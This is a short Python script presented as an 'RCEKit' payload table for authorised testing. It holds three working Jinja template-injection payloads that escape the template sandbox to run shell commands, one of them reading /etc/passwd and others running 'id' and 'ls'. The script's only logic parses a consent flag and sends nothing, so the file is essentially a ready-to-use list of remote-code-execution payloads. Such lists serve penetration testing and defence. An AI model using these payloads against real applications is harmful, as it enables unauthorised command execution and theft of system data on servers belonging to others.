#!/usr/bin/env python3
# RCEKit-style payload table for an authorised test. Payloads are sent only
# to the target named on the command line, after --acknowledge-consent.
import argparse

class RCEKit:
    """Exploit-confirmation toolkit."""

PAYLOADS = {
    "jinja": [
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    ],
}

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--acknowledge-consent", action="store_true")
    parser.parse_args()
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
